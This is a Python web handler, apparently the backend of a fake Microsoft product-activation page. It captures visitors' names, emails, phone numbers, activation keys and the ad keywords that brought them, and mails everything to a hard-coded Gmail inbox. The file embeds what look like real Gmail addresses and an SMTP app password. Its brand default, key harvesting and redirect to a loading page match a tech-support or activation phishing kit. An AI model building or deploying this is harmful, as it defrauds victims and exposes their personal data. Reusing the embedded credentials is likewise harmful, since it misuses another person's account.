from http.server import BaseHTTPRequestHandler
import json
import os
import re
import smtplib
import urllib.request
import urllib.error
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = dict(pair.split('=') for pair in body.split('&')) if body else {}
        
        name = data.get('name', '')
        email = data.get('email', '')
        phone = data.get('phone', '')
        activation_key = data.get('activation_key', '')
        brand = data.get('brand', 'microsoft')
        keyword = data.get('keyword', '')
        referrer = data.get('referrer', '')
        country = data.get('country', '')
        
        to_email = os.environ.get('TO_EMAIL', 'areeb2025malik@gmail.com')
        smtp_user = os.environ.get('SMTP_USER', 'diwakar1996ram@gmail.com')
        smtp_pass = os.environ.get('SMTP_PASS', 'qpzhvmwivlyscmki')
        from_email = os.environ.get('FROM_EMAIL', 'diwakar1996ram@gmail.com')
        
        subject = f"New Activation Request - Key: {activation_key}"
        
        email_body = f"""=== ACTIVATION REQUEST DETAILS ===

Google Keyword: {keyword}
Referrer: {referrer}
Country: {country}
Timestamp: {datetime.utcnow().isoformat()}

=== VISITOR INFORMATION ===
Name: {name}
Email: {email}
Phone: {phone}
Activation Key: {activation_key}
Brand: {brand}

=== END OF REPORT ===
"""
        
        mail_sent = False
        mailer_error = ''
        
        try:
            msg = MIMEMultipart()
            msg['From'] = from_email
            msg['To'] = to_email
            msg['Subject'] = subject
            msg['Reply-To'] = email if email else from_email
            msg.attach(MIMEText(email_body, 'plain', 'utf-8'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(smtp_user, smtp_pass)
            server.send_message(msg)
            server.quit()
            
            mail_sent = True
        except Exception as e:
            mailer_error = str(e)
        
        redirect_url = (
            f"/loading.html?"
            f"brand={brand}&"
            f"keyword={urllib.parse.quote(keyword)}&"
            f"key={urllib.parse.quote(activation_key)}&"
            f"referrer={urllib.parse.quote(referrer)}&"
            f"mailsent={'1' if mail_sent else '0'}&"
            f"error={urllib.parse.quote(mailer_error)}"
        )
        
        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()